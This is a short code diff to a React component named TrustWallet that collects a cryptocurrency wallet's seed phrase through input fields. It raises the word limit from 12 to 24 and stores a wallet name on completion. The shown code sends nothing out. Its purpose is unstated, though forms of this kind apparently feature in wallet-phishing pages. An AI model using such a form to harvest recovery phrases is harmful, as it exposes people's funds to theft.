@@ -17,12 +17,13 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
+		setWalletName(walletName);
 		handleFinish();
 	};
 
 	// Add a new input automatically
 	const addNewInput = () => {
-		if (words.length < 12) {
+		if (words.length < 24) {
 			setWords((prev) => [...prev, ""]);
 			setVisibility((prev) => [...prev, false]);
 			setTimeout(() => {
